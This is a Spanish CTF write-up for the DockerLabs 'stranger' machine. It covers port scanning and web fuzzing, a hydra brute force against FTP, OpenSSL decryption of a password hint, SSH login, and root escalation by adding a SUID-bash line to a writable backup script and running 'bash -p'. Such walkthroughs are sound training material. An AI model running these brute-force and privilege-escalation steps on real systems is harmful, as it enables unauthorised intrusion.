#DockerLabs  #WriteUps 

>[!NOTE] Habilidades
> FTP Brute Force, Private Key Decrypt (OpenSSL), Abusing SUID Binary (Privilege Escalation)


## Lanzar el laboratorio

Para desplegar el laboratorio de `docker` que estaremos explotando, ejecutaremos los siguientes comandos

~~~ bash
# Descomprimimos el archivo
unzip stranger.zip

# Asignamos permisos de ejecución al script que despliega el laboratorio
chmod +x auto_deploy.sh

# Lanzamos el laboratorio
./auto_deploy.sh stranger.tar
~~~

Agregaré la dirección IP como `stranger.local` al archivo `/etc/hosts` por comodidad

~~~ bash
echo '127.17.0.2    stranger.local' >> /etc/hosts
~~~


## Ping

Ahora haremos un `ping` a `stranger.local` para validar la comunicación

~~~ bash
ping -c 1 stranger.local
~~~

![[Pasted image 20241216224907.png]]



# Reconocimiento
---
## Nmap 

Empezaremos el reconocimiento con un escaneo básico de puertos abiertos con `nmap` por TCP

~~~ bash
# Escaneo de puertos abiertos
nmap -sS --open -p- --min-rate 5000 -vvv -n Pn stranger.local -oG allPorts
~~~

- `--open`: Mostrar sólo los puertos que están abiertos en la máquina víctima
- `-p-`: Hacer un escaneo de todo el rango de puertos `1-65535`
- `--min-rate 5000`: Tramitar 5000 paquetes por segundo
- `-n`: No aplicar resolución DNS
- **`-sS`: Modo de escaneo TCP SYN, explicaremos más abajo lo que esto significa**
- `-Pn`: No aplicar descubrimiento de host/meterte una pinga por el culo
- `-v`: Mostrar el `output` por la consola en tiempo real
- `-oG`: Exportar el archivo en formato `grep`

![[Pasted image 20241216225126.png]]

Ahora haremos un segundo escaneo de la versión y servicio que se ejecuta en los puertos que encontramos anteriormente

~~~ bash
# Escaneo de servicios
nmap -sVC -p 21,22,80 stranger.local -oN services
~~~

- `-sV`: Escanear la versión del servicio que se ejecuta
- `-sC`: Escaneo con scripts básicos de reconocimiento
- `-oN`: Exportar en formato normal (tal como se ve por consola)

![[Pasted image 20241216225941.png]]

Vemos servicios como `ftp`, `ssh` y `http`, si buscamos vulnerabilidades conocidas de acuerdo a la versión de estos servicios no encontraremos gran cosa, veamos el servicio web que ejecuta esta máquina

## Whatweb

Echemos un vistazo a la web, con la herramienta `whatweb` analizaremos las tecnologías que se ejecutan en este servicio web

~~~ bash
whatweb http://stranger.local
~~~

![[Pasted image 20241216230934.png]]

No encontramos gran cosa más que la versión de `apache` y el sistema operativo, que en este caso es Ubuntu

![[Pasted image 20241216235750.png]]

Se le está dando la bienvenida a `mwheeler`, quien puede ser un usuario válido en la máquina víctima

## Fuzzing

Como la página actual no nos brinda más información, lo siguiente que podemos hacer es buscar directorios haciendo `fuzzing`, usaremos la herramienta `wfuzz`. Ejecutemos el siguiente comando

~~~ bash
wfuzz -c --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://stranger.local/FUZZ
~~~

- `--hc=404`: Ocultar el código de estado 404 (Archivo no encontrado)

![[Pasted image 20241217002107.png]]

Encontramos un directorio `stranger`, accederemos a él para ver su contenido

![[Pasted image 20241217002522.png]]

Accedemos a lo que parece ser un blog que aparentemente pertenece a `will`, este puede ser un usuario válido dentro de la máquina, lo consideraremos más tarde. Dado que ningún enlace funciona y no vemos mayor información que pueda ser de utilidad, buscaremos archivos o rutas que puedan existir bajo `http://stranger.local/strange/`


## Encontrando archivos con gobuster

Configuraremos `gobuster` para que buscar archivos de acuerdo con una lista de extensiones que definiremos con el parámetro `-x`, tales como: `php`, `html`, `xml` y `txt`. Usaremos el siguiente comando buscando bajo la ruta `/strange`

~~~ bash
gobuster dir -u http://stranger.local/strange/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x txt,php,xml,html
~~~

![[Pasted image 20241218235740.png]]

Vemos una página `secret.html` y un archivo `private.txt`, veamos la página y descarguemos el archivo `private.txt`

~~~ bash
wget http://stranger.local/strange/private.txt
~~~

![[Pasted image 20241219002434.png]]

Nos dirigimos a `secret.html` para ver su contenido

![[Pasted image 20241218235959.png]]

Se nos da una pista acerca del acceso por `ftp`, donde el usuario es `admin` y se nos sugiere el diccionario `rockyou.txt` para descubrir la contraseña



# Explotación
---
## FTP Brute force

Haremos fuerza bruta al protocolo `ftp` con la herramienta `hydra` usando el diccionario `rockyou.txt`, para lanzar este ataque especificamos el usuario `admin`

~~~ bash
hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt ftp://stranger.local
~~~

- `-l`: Usuario
- `-P`: Listado de palabras o `wordlist`

![[Pasted image 20241219000649.png]]

Descubrimos la contraseña `banana` para el usuario `admin`, ingresemos por `ftp` a la máquina víctima

~~~ bash
ftp stranger.local
~~~

Si listamos el contenido con `ls`, vemos un archivo que parece ser una clave privada

![[Pasted image 20241219001041.png]]

Descarguemos el archivo en nuestra máquina

~~~ bash
get private_key.pem
~~~

![[Pasted image 20241219001242.png]]


## Decrypt Private key (OpenSSL)

Con la ayuda de `openssl` podemos desencriptar la clave `private_key.pem` usando el archivo `private.txt`. Almacenaremos el resultado en un archivo, por ejemplo lo llamaré `desencripted.txt`, ejecutemos el siguiente comando

~~~ bash
openssl pkeyutl -decrypt -in private.txt -out desencripted.txt -inkey private_key.pem
~~~

La opción `pkeyutl` realiza operaciones de clave pública de bajo nivel utilizando cualquier algoritmo compatible. En este caso, se usa para desencriptar el mensaje que está en `private.txt`, utilizando el parámetro `-decrypt` en conjunto con la clave privada `private_key.pem`

![[Pasted image 20241219002636.png]]

Una vez desencriptamos la clave privada descubrimos la palabra `demogorgon`, guardaremos esta palabra para intentar usarla como la contraseña de algún usuario. Crearemos un archivo con cada usuario potencial para intentar acceder con esta clave con la ayuda de `hydra`

~~~ bash
nano users.txt
~~~

![[Pasted image 20241219002536.png]]

Ahora hacemos lo mismo, pero creamos un archivo de las palabras que usaremos como contraseña

~~~ bash
nano passes.txt
~~~

![[Pasted image 20241219003231.png]]


## Validación de credenciales

Ahora ejecutamos el siguiente comando para intentar acceder con las credenciales que hemos encontrado

~~~ bash
hydra -L users.txt -P passes.txt ssh://stranger.local
~~~

![[Pasted image 20241219003357.png]]

Y la contraseña `demogorgon` pertenece al usuario `mwheeler`, ya nos podremos conectar por `ssh`

~~~ bash
ssh mwheeler@stranger.local
~~~

![[Pasted image 20241219003517.png]]

Una vez estamos dentro del sistema, haremos un pequeño tratamiento de la TTY sólo para hacer `Ctrl + L` cambiando el valor de la variable de entorno `TERM`

~~~ bash
export TERM=xterm
~~~

![[Pasted image 20241219003555.png]]




# Escalada de privilegios
---
## Privilegios sudo (Posible)

Primeramente, verificamos si tenemos privilegios `sudo` sobre algún archivo o ejecutable, sin embargo, no obtendremos un resultado esperanzador

~~~ bash
sudo -l
~~~

![[Pasted image 20241219003736.png]]

## Encontrando archivos SUID (Posible)

Podemos buscar archivos que tengan el bit `SUID` asignado, pero en este caso buscaremos archivos que podamos modificar, donde el propietario sea `root` 

~~~ bash
find / -perm /4000 2>/dev/null
~~~

![[Pasted image 20241224003350.png]]


## Archivos modificables

Podemos buscar archivos los cuales tengamos capacidad de escritura donde el propietario sea `root`

~~~ bash
find / -type f -writable -user root 2>/dev/null
~~~

![[Pasted image 20241219004100.png]]

Para evitar este output que no nos interesa, podemos hacer uso de un `pipe` con el comando `grep` para ocultar la palabra `proc` en la salida de este comando

~~~ bash
find / -type f -writable -user root 2>/dev/null | grep -v proc
~~~

En el comando anterior buscamos 

![[Pasted image 20241219004226.png]]

Vemos que el archivo `backup.sh` tiene asignado el bit `suid`, podemos intentar aprovecharnos de este archivo para escalar nuestros privilegios

~~~ bash
cat /usr/local/bin/backup.sh
~~~

![[Pasted image 20241219004634.png]]

Como tenemos capacidad de escritura, podemos modificar el archivo y hacer que ejecute algún comando

~~~ bash
vim /usr/local/bin/backup.sh
~~~

Agregamos la siguiente instrucción al archivo para que asigne el bit `suid` a la `bash`, esto nos permitirá ejecutar `bash` como el propietario, que es `root`

![[Pasted image 20241219013559.png]]

Con la esperanza de que un usuario con privilegios algún día ejecute el script, con una inspección de procesos y tareas `cron`, me de dado cuenta que no. Entonces buscaremos otra forma de escalar privilegios

## Reutilización de credenciales

Veamos los usuarios válidos en esta máquina, ejecutaremos el siguiente comando

~~~ bash
cat /etc/passwd | grep sh | grep -v ssh
~~~

![[Pasted image 20241224010223.png]]

Como anteriormente accedimos como `admin` al servicio `ftp`, veamos si se reutiliza la contraseña `banana`

~~~ bash
su admin
~~~

![[Pasted image 20241219013202.png]]


## Privilegios sudo

Veamos qué podemos ejecutar con `sudo`

![[Pasted image 20241219013242.png]]

## Root time

Dado que no tenemos restricciones, ejecutaremos el script para poder escalar de esa forma ya que usando este usuario solo sería `sudo su` xd

~~~ bash
# Ejecutando el script simulando ser root
sudo /usr/local/bin/backup.sh
~~~

![[Pasted image 20241219013823.png]]

Ahora es como si la tarea mágicamente fue ejecutada, comprobaremos los permisos de la `bash`

~~~ bash
ls -la /bin/bash
~~~

![[Pasted image 20241219013853.png]]

Ahora con el siguiente comando ejecutaremos `bash`, y deberíamos obtener una consola como `root`

~~~ bash
bash -p
~~~

![[Pasted image 20241219013939.png]]


